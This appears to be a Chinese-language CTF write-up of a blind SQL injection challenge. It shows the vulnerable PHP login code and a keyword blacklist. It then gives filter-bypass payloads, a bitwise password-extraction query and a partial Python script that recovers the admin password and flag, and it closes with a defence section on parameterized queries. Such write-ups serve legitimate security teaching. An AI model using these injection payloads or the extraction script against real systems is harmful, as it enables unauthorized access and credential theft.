---
title: "CTF Web 基础三题（一）—— SQL 盲注：从「万能密码」到把密码问出来"
date: "2026-10-23"
tags: ["Security", "CTF", "Web"]
excerpt: "登录框只回「成功」或「失败」，空格和常见关键字全被过滤。用 7 位二进制把密码一位一位问出来，32 个字符共 224 次请求。"
series: "ctf-web-basics"
seriesOrder: 1
---

> 题目环境：PHP 7.4.5 + MySQL，登录框，`/?source` 泄露源码。
> 最终 flag：`ctfhub{4b74024b72386ef7809c4d75}`

## 一、一句话考点

**这不是「绕过登录」，是「通过一个是非回答器，把数据库里的密码一位一位问出来」。**

## 二、题目长什么样

`?source` 给出的核心代码：

```php
function checkSql($s) {
    if(preg_match("/regexp|between|in|flag|=|>|<|and|\||right|left|reverse|update|extractvalue|floor|substr|&|;|\\\$|0x|sleep|\ /i", $s)){
        alertMes('hacker', 'index.php');
    }
}

$username = $_POST['username'];
$password = $_POST['password'];
if ($username !== 'admin') { alertMes('only admin can login', 'index.php'); }
checkSql($password);

$sql = "SELECT password FROM users WHERE username='admin' and password='$password';";
$user_result = mysqli_query($con, $sql);
$row = mysqli_fetch_array($user_result);
if (!$row) { alertMes("something wrong", 'index.php'); }
if ($row['password'] === $password) { die($FLAG); }
else { alertMes("wrong password", 'index.php'); }
```

三个关键事实：

1. `username` 必须**严格等于** `admin`，没有注入空间。
2. `password` 被直接拼进 SQL，可以注入。
3. **查出来的密码还要和输入严格相等**，才会给 flag。

## 三、为什么「万能密码」不行

经典 payload：`' or 1#`

拼出来的 SQL：

```sql
SELECT password FROM users WHERE username='admin' and password='' or 1#';
```

WHERE 恒真，确实返回了 admin 那一行。但是——

```php
$row['password'] === $password
```

左边是**数据库里的真实密码**，右边是你输入的 `' or 1#`，永远不相等。页面只会回 `wrong password`。

所以这道题的目标不是「让查询返回行」，而是「知道真实密码」。

## 四、过滤表：被禁什么，换什么

黑名单（不区分大小写，且**空格也被禁**）：

```
regexp between in flag = > < and | right left reverse
update extractvalue floor substr & ; $ 0x sleep 空格
```

| 被禁 | 替代写法 | 说明 |
|---|---|---|
| 空格 | 不用空格，直接 `'or(...)#` | 关键字符相邻即可 |
| `=` | `like` | 字符串比较 |
| `substr` | `mid` | 同义函数 |
| `and` | `or` | `'' or 条件` |
| `>` `<` | 不需要 | 盲注只用「是不是」 |
| `;` 和收尾 `'` | `#` | 注释掉剩下的 SQL |
| `flag` | 不查 flag 表 | 这里只需要 `users.password` |

顺带一个坑：**`admin` 本身就会触发过滤**，因为 `admin` 里含 `in`。所以密码字段不能直接填 `admin`。

## 五、建立 oracle（先花 2 个请求）

| 请求 | 查询结果 | 页面 |
|---|---|---|
| `password='or(1)#` | 有行 | `wrong password` |
| `password='or(0)#` | 无行 | `something wrong` |

这两个不同响应就是「是 / 否」。

这一步非常重要：**在写任何脚本之前，先确认真假两个分支的响应确实不同**。否则后面几百次请求全是废的。

## 六、提取算法：每个字符 7 位

一个 ASCII 字符 ≤ 127，用 **7 位二进制**表示。把每一位变成一个「是/否」问题：

```sql
-- 第 i 个字符的二进制，前 k 位是不是 prefix + "1"
lpad(conv(ord(mid(password,i,1)),10,2),7,'0') like 'prefix1%'
```

拆开看：

| 片段 | 作用 |
|---|---|
| `mid(password,i,1)` | 取第 i 个字符 |
| `ord(...)` | 取 ASCII 码 |
| `conv(...,10,2)` | 十进制转二进制字符串 |
| `lpad(...,7,'0')` | 左补 0 到 7 位，保证长度一致 |
| `like '1101%'` | 问「前 4 位是不是 1101」 |

每一位问一次，7 次得到一个字符。**32 个字符 = 224 次请求**——必须脚本化。

## 七、完整脚本（节选）

```python
def ok(sql):
    """True = 查询有行（页面出现 wrong password）"""
    t = raw("'or(" + sql + ")#")
    time.sleep(0.7)
    if 'wrong password' in t: return True
    if 'something wrong' in t: return False
    raise RuntimeError('unexpected: ' + t[:200])

def get_length():
    for d in '0123456789':
        if ok("length(password)like'3" + d + "'"):
            return 30 + int(d)

def get_char(i):
    pref = ''
    for _ in range(7):
        if ok("lpad(conv(ord(mid(password,{},1)),10,2),7,'0')like'{}1%'".format(i, pref)):
            pref += '1'
        else:
            pref += '0'
    return chr(int(pref, 2))
```

运行结果：

```
length = 32
PASSWORD = 'CUIWWesAPMlE0OJbepfPY7EMq4sXG4mR'
FINAL RESPONSE: ctfhub{4b74024b72386ef7809c4d75}
```

拿到密码后**普通登录**，`$row['password'] === $password` 成立，直接 `die($FLAG)`。

## 八、踩过的坑

1. **以为 `' or 1#` 就够了**：忽略了 `===` 比较，白高兴一场。
2. **没先验证 oracle**：真假响应如果一样，后面全是无用功。
3. **请求太快被限流**：平台会返回 500，看起来像 WAF，其实是节流。加 `sleep(0.6)` 和重试退避。
4. **`admin` 触发过滤**：测试时用 `admin` 当密码，页面回 `hacker`，一开始还以为是 WAF。

## 九、如果过滤再加一条

| 新过滤 | 应对 |
|---|---|
| 禁 `like` | `REGEXP`（如果没禁）、`strcmp`、`greatest` 做比较 |
| 禁 `mid` | `substring`、`right`/`left`（如果没禁） |
| 禁 `conv` | 十进制逐位：`ord(...) like '9%'` 做前缀搜索，或 `lpad` 手动补 |
| 禁 `#` | `-- ` 需要空格，改用 `/**/` 注释收尾 |
| 禁 `or` | `\|\|`（如果没禁）、`union` 配合 `where` |

## 十、这类题怎么认

看到下面这些信号，就该想到盲注：

- 有 SQL 拼接（`"... '$x' ..."`）
- 页面**不回显查询结果**，只有「成功/失败」「存在/不存在」
- 过滤了常见关键字，但**替换语法还在**

## 十一、防御（写给自己以后修）

```php
$stmt = $con->prepare("SELECT password FROM users WHERE username=? AND password=?");
$stmt->bind_param("ss", $username, $password);
```

真正的修复只有一条：**预编译参数化**。黑名单永远可以被绕过。

另外 `$row['password'] === $password` 这种「明文密码比较」本身也不该出现，密码应该哈希存储、用 `password_verify` 比较。
